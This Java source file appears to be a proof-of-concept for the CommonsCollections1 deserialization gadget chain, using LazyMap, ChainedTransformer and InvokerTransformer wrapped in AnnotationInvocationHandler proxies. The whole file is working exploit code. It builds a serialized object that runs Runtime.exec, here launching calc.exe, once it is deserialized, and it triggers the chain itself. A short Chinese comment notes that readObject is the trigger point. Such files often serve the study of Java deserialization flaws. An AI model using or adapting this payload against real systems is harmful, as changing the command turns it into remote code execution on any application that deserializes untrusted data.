package org.payload.cc.CC1;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1LazyMap {
    public static  void main(String[] args) throws Exception {
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"C:\\Windows\\System32\\calc.exe"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        HashMap <String, String> inner = new HashMap();
        //inner.put("test", "test");
        Map evilMap = LazyMap.decorate(inner, transformerChain);
        //Class clz = Class.forName("org.apache.commons.collections.map.LazyMap");
        //Constructor con = clz.getDeclaredConstructor(Map.class, Transformer.class);
        //Method m = clz.getMethod("decorate", Map.class, Transformer.class);
        //Map evilMap = (LazyMap)m.invoke(inner, transformerChain);
        //con.setAccessible(true);
        //LazyMap lz = (LazyMap) con.newInstance(inner, transformerChain);
        //lz.get("test");

        Field f = org.apache.commons.collections.functors.ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        Class<?>[] cls = evilMap.getClass().getInterfaces();
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, evilMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                evilMap.getClass().getInterfaces(),
                handler);
        //触发点是AnnotationInvocationHandler的readObject 所以还需要AnnotationInvocationHandler包装
        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler1);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
